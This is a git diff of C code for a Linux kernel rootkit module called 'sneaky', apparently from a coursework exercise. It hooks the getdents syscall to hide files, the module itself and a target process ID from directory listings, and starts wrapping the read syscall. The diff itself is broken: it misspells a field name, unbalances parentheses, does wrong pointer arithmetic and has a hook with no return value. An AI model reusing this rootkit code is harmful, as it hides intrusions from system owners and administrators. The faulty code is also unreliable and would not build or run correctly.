@@ -60,25 +60,29 @@ asmlinkage long sneaky_sys_getdents(unsigned int fd,
 
   struct linux_dirent *evil;
   int position;
-  char *dbuf = (char *)dirent;
+  char *init = (char *)dirent;
   for (position = 0; position < read_len;) {
-    evil = (struct linux_dirent *)(dbuf + position);
+    evil = (struct linux_dirent *)(init + position);
     if (strncmp(evil->d_name, SNEAKY_PREFIX, SNEAKY_PREFIX_SIZE) == 0 ||
-        strstr(evil->d_name, SNEAKY_MODULE) != NULL) {
+        strstr(evil->d_name, SNEAKY_MODULE) != NULL ||
+        strcmp(evil->dname, sneaky_pid) == 0) ) {
 
-      memcpy(dbuf + position, dbuf + position + evil->d_reclen,
-             read_len - (position +
-                         evil->d_reclen)); // delete this sub dire/file by
-                                           // moving things behind it forward
-    } else if () {
-    } else {
+        memcpy(init + position, init + position + evil->d_reclen,
+               read_len - (position +
+                           evil->d_reclen)); // delete this sub dire/file by
+                                             // moving things behind it forward
+        evil -= evil->d_reclen;
+      }
+    else {
       position += evil->d_reclen; // if not sneaky part,comes to next entry
     }
   }
   return read_len;
 }
 
-asmlinkage int sneaky_sys_read(int fd, void *buf, size_t count) {}
+asmlinkage int sneaky_sys_read(int fd, void *buf, size_t count) {
+  int ori_value = original_read(fd, buf, count);
+}
 asmlinkage int sneaky_sys_close(int fd) {}
 // The code that gets executed when the module is loaded
 static int initialize_sneaky_module(void) {
